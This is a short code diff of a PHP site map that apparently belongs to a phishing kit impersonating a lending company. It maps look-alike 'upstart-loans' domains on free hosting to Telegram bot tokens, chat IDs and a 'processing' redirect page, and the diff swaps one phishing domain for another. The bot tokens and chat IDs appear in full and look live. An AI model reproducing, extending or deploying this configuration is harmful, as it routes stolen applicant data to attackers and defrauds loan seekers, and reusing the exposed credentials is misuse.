@@ -40,13 +40,13 @@ $site_map = [
         ],
         'redirect' => 'https://upstart-loans.42web.io/cache_site/processing.html'
     ],
-    'upstart-loans.wuaze.com' => [
+    'upstart-loans.rf.gd' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => '7956417008:AAE_AajDMFr5uyaWrObRwXSRCsXXDeAlBuQ', 'chat_id' => '1566821522']
 
         ],
-        'redirect' => 'https://upstart-loans.wuaze.com/cache_site/processing.html'
+        'redirect' => 'https://upstart-loans.rf.gd/cache_site/processing.html'
     ],
     'upstartloans.rf.gd' => [
         'bots' => [
